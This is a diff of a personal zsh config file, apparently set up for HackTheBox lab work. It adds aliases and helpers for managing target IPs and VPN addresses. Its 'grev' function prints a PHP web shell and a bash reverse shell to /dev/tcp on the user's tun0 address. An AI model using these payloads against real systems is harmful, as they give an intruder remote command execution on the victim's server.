@@ -83,19 +83,25 @@ oak () { "$@" & disown & exit; }
 alias msfconsole="msfconsole -x \"db_connect js@msf\""
 #nvm
 alias nvmi="source /usr/share/nvm/init-nvm.sh;nvm use 12.14"
-#htb
+
+### Hacking 
 export tip='1.2.3.4'
 
 alias htbi="sudo openvpn ~/hacking/hackthebox/htb-vpn.ovpn"
-alias htbu="sudo /opt/htbExplorer/htbExplorer -v /home/js/hacking/hackthebox/htb-vpn.ovpn"
-alias htb="sudo /opt/htbExplorer/htbExplorer"
 alias getp="cat open | grep -oE '[0-9]+/'  | tr -d '/' | tr '\n' ','| xargs | xclip -sel c -r"
 
+# Update Target IP
 function uptip(){
-	sed -i "s/^export tip='.*/export tip='$1'/g" /home/js/.zshrc;
+	sed -i --follow-symlinks "s/^export tip='.*/export tip='$1'/g" /home/js/.zshrc;
 	export tip="$1";
 }
 
+# Get tun0 ip
+function gtunip(){
+	ip a | grep -A3 tun0 | grep inet | awk '{print $2}' | cut -d '/' -f 1 | head -n 1
+}
+
+# HackTheBox machine creator
 function htbc() {
 	#Variables
 	machine_name="$1"
@@ -114,6 +120,21 @@ function htbc() {
 	#Cd into recon and updating target ip
 	cd recon;
 	uptip $machine_ip;
+}
+
+# Reverse shell generator
+function grev(){
+	# Switch case for reverse shell type
+	case $1 in
+		"php")
+			echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>";
+			;;
+		*)
+			# Fallback to bash reverse shell
+			echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
+			;;
+	esac
+			
 }
 
 #python
